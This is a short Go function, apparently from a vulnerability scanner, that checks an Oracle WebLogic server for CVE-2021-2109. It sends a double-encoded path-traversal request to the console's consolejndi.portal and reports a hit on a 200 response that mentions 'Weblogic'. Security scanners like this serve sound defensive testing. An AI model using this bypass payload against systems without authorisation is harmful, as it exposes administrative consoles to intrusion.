package weblogic

import (
	"github.com/yhy0/Jie/pkg/protocols/http"
	"strings"
)

func CVE_2021_2109(url string) bool {
	if req, err := http.Request(url+"/console/css/%252e%252e%252f/consolejndi.portal", "GET", "", false, nil); err == nil {
		if req.StatusCode == 200 && strings.Contains(req.Body, "Weblogic") {
			return true
		}
	}
	return false
}
